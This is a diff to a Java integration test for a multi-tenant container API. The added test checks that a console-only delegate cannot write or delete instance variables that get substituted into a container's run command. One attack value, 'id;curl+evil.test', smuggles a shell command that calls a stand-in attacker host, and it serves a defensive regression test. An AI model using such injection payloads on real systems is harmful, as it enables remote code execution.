@@ -2,8 +2,10 @@ package be.elevenways.hohenheim.test.instance;
 
 import be.elevenways.hohenheim.model.InstanceModel;
 import be.elevenways.hohenheim.model.InstanceTemplateModel;
+import be.elevenways.hohenheim.model.InstanceVariableModel;
 import be.elevenways.hohenheim.server.auth.HohenheimAccess;
 import be.elevenways.hohenheim.server.instance.InstanceService;
+import be.elevenways.hohenheim.server.instance.InstanceVariables;
 import be.elevenways.hohenheim.test.HohenheimTestBase;
 import be.elevenways.hohenheim.test.TenantConduits;
 import be.elevenways.zenit.auth.AuthKeys;
@@ -59,32 +61,56 @@ class TenantInstanceApiTest extends HohenheimTestBase {
 
     private static Integer tenantAId;
     private static Integer tenantBId;
+    private static Integer tenantConsoleId;
+    private static Integer tenantViewId;
     private static Integer instanceAId;
     private static Integer instanceBId;
+    private static Integer instanceCId;
     private static Integer unapprovedTemplateId;
 
     private static String keyManageA;
     private static String keyCreateA;
     private static String keyManageB;
     private static String keySnapshotsA;
+    private static String keyConsoleC;
+    private static String keyViewC;
     private static String sessionA;
+
+    /** The token instance C's command substitutes, so a written variable IS what runs. */
+    private static final String PWN_KEY = "PWN";
 
     @BeforeAll
     static void seed() {
         tenantAId = tenant("api-tenant-a@surface.test", "Api Tenant A");
         tenantBId = tenant("api-tenant-b@surface.test", "Api Tenant B");
+        tenantConsoleId = tenant("api-tenant-console@surface.test", "Api Tenant Console");
+        tenantViewId = tenant("api-tenant-view@surface.test", "Api Tenant View");
 
         instanceAId = instance(PREFIX + "alpha");
         instanceBId = instance(PREFIX + "bravo");
+        instanceCId = instanceRunning(PREFIX + "charlie", "sleep {{" + PWN_KEY + "}}");
         RecordGrants.grant("user", tenantAId, InstanceModel.MODEL_ID, instanceAId,
             HohenheimAccess.MANAGE, true);
         RecordGrants.grant("user", tenantAId, InstanceModel.MODEL_ID, instanceAId,
             HohenheimAccess.SNAPSHOTS, true);
         RecordGrants.grant("user", tenantBId, InstanceModel.MODEL_ID, instanceBId,
             HohenheimAccess.MANAGE, true);
+        // The Phase 3 gate's own worked example: a delegate handed console (and, through
+        // the umbrella, view) and NOTHING else on instance C. And a second delegate with
+        // bare view, for the read lanes.
+        RecordGrants.grant("user", tenantConsoleId, InstanceModel.MODEL_ID, instanceCId,
+            HohenheimAccess.CONSOLE, true);
+        RecordGrants.grant("user", tenantViewId, InstanceModel.MODEL_ID, instanceCId,
+            HohenheimAccess.VIEW, true);
+        // A value that already exists, so the DELETE lane has something real to aim at.
+        new InstanceVariables().setValue(instanceCId, null, "SEEDED",
+            InstanceVariableModel.KIND_PLAIN, "seeded-value");
 
         String manageScope = CapabilityScopes.format(InstanceModel.MODEL_ID, HohenheimAccess.MANAGE);
         String snapshotScope = CapabilityScopes.format(InstanceModel.MODEL_ID, HohenheimAccess.SNAPSHOTS);
+        String consoleScope = CapabilityScopes.format(InstanceModel.MODEL_ID, HohenheimAccess.CONSOLE);
+        String configScope = CapabilityScopes.format(InstanceModel.MODEL_ID, HohenheimAccess.CONFIG);
+        String viewScope = CapabilityScopes.format(InstanceModel.MODEL_ID, HohenheimAccess.VIEW);
         keyManageA = ApiKeyService.create(tenantAId, PREFIX + "a-manage",
             List.of(manageScope), null).plaintext();
         keySnapshotsA = ApiKeyService.create(tenantAId, PREFIX + "a-snapshots",
@@ -95,6 +121,16 @@ class TenantInstanceApiTest extends HohenheimTestBase {
         // lane is exercised against the FUNNEL rather than against key narrowing.
         keyCreateA = ApiKeyService.create(tenantAId, PREFIX + "a-create",
             List.of(manageScope, HohenheimAccess.INSTANCES_CREATE.value()), null).plaintext();
+        // AIDEV-NOTE: these two keys carry MORE scope than their owner holds on the record
+        // (config/console the grant never gave), which is deliberate: the key-narrowing
+        // layer is proven separately in aKeyCannotExceedItsScopesNorItsOwnersAuthority, and
+        // here it must NOT be the thing that refuses -- otherwise the journey would pass
+        // with the record-capability gate missing entirely, which is exactly the state this
+        // repo shipped in.
+        keyConsoleC = ApiKeyService.create(tenantConsoleId, PREFIX + "c-console",
+            List.of(consoleScope, configScope), null).plaintext();
+        keyViewC = ApiKeyService.create(tenantViewId, PREFIX + "c-view",
+            List.of(viewScope, consoleScope, configScope), null).plaintext();
 
         Session session = Zenit.getSessionStore().create();
         session.set(AuthKeys.USER_ID, tenantAId.longValue());
@@ -114,6 +150,10 @@ class TenantInstanceApiTest extends HohenheimTestBase {
 
     @AfterAll
     static void cleanUp() {
+        Model variables = Models.get(InstanceVariableModel.class);
+        for (Integer instanceId : List.of(instanceAId, instanceBId, instanceCId)) {
+            variables.find().where(InstanceVariableModel.INSTANCE_ID.eq(instanceId)).delete();
+        }
         Model instances = Models.get(InstanceModel.class);
         for (Row row : instances.find().where(InstanceModel.NAME.startsWith(PREFIX)).all()) {
             instances.delete(row.get(InstanceModel.ID));
@@ -136,15 +176,43 @@ class TenantInstanceApiTest extends HohenheimTestBase {
     }
 
     private static int instance(String name) {
+        return instanceRunning(name, "sleep 300");
+    }
+
+    private static int instanceRunning(String name, String command) {
         Model instances = Models.get(InstanceModel.class);
         Row row = instances.createEmptyRow();
         row.set(InstanceModel.NAME, name);
         row.set(InstanceModel.KIND, "hohenheim:docker_container");
         row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
-            Map.of("image", "alpine", "tag", "latest", "command", "sleep 300")));
+            Map.of("image", "alpine", "tag", "latest", "command", command)));
         row.set(InstanceModel.STATUS, InstanceModel.STATUS_CREATED);
         instances.save(row);
         return row.get(InstanceModel.ID);
+    }
+
+    /** The command an actual deploy would run: the record's settings with variables applied. */
+    @SuppressWarnings("unchecked")
+    private static String effectiveCommand(int instanceId) {
+        Row instance = Models.get(InstanceModel.class).findById(instanceId);
+        Object stored = instance.get(InstanceModel.SETTINGS);
+        Map<String, Object> settings = stored instanceof Map<?, ?> map
+            ? (Map<String, Object>) map : Map.of();
+        InstanceVariables variables = new InstanceVariables();
+        Object applied = variables.applyToSettings(settings,
+            variables.valuesFor(instanceId)).get("command");
+        return applied == null ? "" : String.valueOf(applied);
+    }
+
+    /** @return the stored value of one instance variable, or null when there is no row */
+    private static String storedVariable(int instanceId, String key) {
+        for (Row row : Models.get(InstanceVariableModel.class).findByInstanceId(instanceId)) {
+            if (key.equals(row.get(InstanceVariableModel.KEY))) {
+                Object value = row.get(InstanceVariableModel.PLAIN_VALUE);
+                return value == null ? "" : String.valueOf(value);
+            }
+        }
+        return null;
     }
 
     private String baseUrl() {
@@ -371,6 +439,104 @@ class TenantInstanceApiTest extends HohenheimTestBase {
         assertThat(refusedImageAny)
             .as("step 4: a non-delegable capability can never enter a key scope")
             .isInstanceOf(IllegalArgumentException.class);
+    }
+
+    /**
+     * COUNTERFACTUAL: the variable and log lanes answer to the capability their ACT needs,
+     * not to the {@code view} the shared visibility resolver checks.
+     *
+     * The Phase 3 gate's worked example run end to end: a delegate with console (and the
+     * view it implies) and nothing else must not be able to change what the workload runs.
+     * A variable substitutes into {@code command} at deploy, so a variable write IS a
+     * config write; before this was enforced, this delegate wrote one and the instance's
+     * effective command became attacker-chosen text.
+     */
+    @Test
+    @Order(5)
+    void aConsoleOnlyDelegateCannotWriteTheVariablesThatBecomeTheCommand() throws Exception {
+        // 1. The delegate really does see the record: console implies view, so a refusal
+        //    below is about the ACT and never about visibility.
+        assertThat(keyGet(keyConsoleC, "/api/v1/instances/" + instanceCId).statusCode())
+            .as("step 1: the console delegate can read the record it was delegated")
+            .isEqualTo(200);
+        assertThat(effectiveCommand(instanceCId))
+            .as("step 1: and the command still carries its unsubstituted token")
+            .isEqualTo("sleep {{" + PWN_KEY + "}}");
+
+        // 2. THE ATTACK. Writing a variable is writing what runs.
+        //    STATE is asserted BEFORE the status code, deliberately: a refusal that still
+        //    wrote the row passes a status-only test, and the escalation is what matters.
+        HttpResponse<String> written = keyPost(keyConsoleC,
+            "/api/v1/instances/" + instanceCId + "/variables",
+            "key=" + PWN_KEY + "&kind=plain&value=id;curl+evil.test");
+        assertThat(effectiveCommand(instanceCId))
+            .as("step 2: the command the next deploy runs is UNCHANGED -- a console-only"
+                + " delegate must not be able to choose what the workload executes")
+            .isEqualTo("sleep {{" + PWN_KEY + "}}");
+        assertThat(storedVariable(instanceCId, PWN_KEY))
+            .as("step 2: and nothing was persisted at all").isNull();
+        assertThat(written.statusCode())
+            .as("step 2: the refusal is typed").isEqualTo(422);
+        assertThat(written.body())
+            .as("step 2: with the uniform capability refusal, never a capability oracle")
+            .contains("instance_not_permitted");
+
+        // 3. DELETE is authority over the row too: removing an injected credential is as
+        //    much a config act as adding one.
+        HttpResponse<String> deleted = keyPost(keyConsoleC,
+            "/api/v1/instances/" + instanceCId + "/variables/delete", "key=SEEDED");
+        assertThat(storedVariable(instanceCId, "SEEDED"))
+            .as("step 3: the value is STILL THERE -- the delete did not happen")
+            .isEqualTo("seeded-value");
+        assertThat(deleted.statusCode()).as("step 3: refused, typed").isEqualTo(422);
+        assertThat(deleted.body()).as("step 3: same uniform refusal")
+            .contains("instance_not_permitted");
+
+        // 4. READING stays at view: the projection names a secret without its value, so a
+        //    view delegate learns the shape of the environment and none of its material.
+        HttpResponse<String> read = keyGet(keyViewC,
+            "/api/v1/instances/" + instanceCId + "/variables");
+        assertThat(read.statusCode()).as("step 4: a view delegate may list variables")
+            .isEqualTo(200);
+        assertThat(read.body()).as("step 4: keys and plain values, by name")
+            .contains("SEEDED").contains("seeded-value");
+
+        // 5. The LOG tail is console material, so it answers to console -- the one-shot
+        //    read must not be a wider door than the WebSocket that streams the same bytes.
+        HttpResponse<String> viewLogs = keyGet(keyViewC,
+            "/api/v1/instances/" + instanceCId + "/logs");
+        assertThat(viewLogs.statusCode()).as("step 5: a view-only delegate is refused, typed")
+            .isEqualTo(422);
+        assertThat(viewLogs.body()).as("step 5: by the capability gate, named")
+            .contains("instance_not_permitted");
+
+        // 6. POSITIVE ANCHOR for the log lane: the console holder passes the gate and the
+        //    refusal moves on to the driver. Without this, step 5 would prove only that
+        //    logs never work.
+        HttpResponse<String> consoleLogs = keyGet(keyConsoleC,
+            "/api/v1/instances/" + instanceCId + "/logs");
+        assertThat(consoleLogs.body())
+            .as("step 6: the console delegate is past the capability gate")
+            .doesNotContain("instance_not_permitted");
+
+        // 7. POSITIVE ANCHOR for the write lane: the legitimate holder still succeeds, and
+        //    the value really does reach what the workload runs. Tenant A holds manage on
+        //    instance A, and manage IMPLIES config.
+        HttpResponse<String> allowed = keyPost(keyManageA,
+            "/api/v1/instances/" + instanceAId + "/variables",
+            "key=GREETING&kind=plain&value=hello");
+        assertThat(allowed.statusCode()).as("step 7: the config holder's write is accepted")
+            .isEqualTo(200);
+        assertThat(storedVariable(instanceAId, "GREETING"))
+            .as("step 7: and it is persisted").isEqualTo("hello");
+
+        // 8. ... and so does the delete, on the same record.
+        HttpResponse<String> allowedDelete = keyPost(keyManageA,
+            "/api/v1/instances/" + instanceAId + "/variables/delete", "key=GREETING");
+        assertThat(allowedDelete.statusCode()).as("step 8: the config holder may remove it")
+            .isEqualTo(200);
+        assertThat(storedVariable(instanceAId, "GREETING"))
+            .as("step 8: and the row is gone").isNull();
     }
 
     /** A conduit carrying nothing but an identity, for the interactive mint path. */
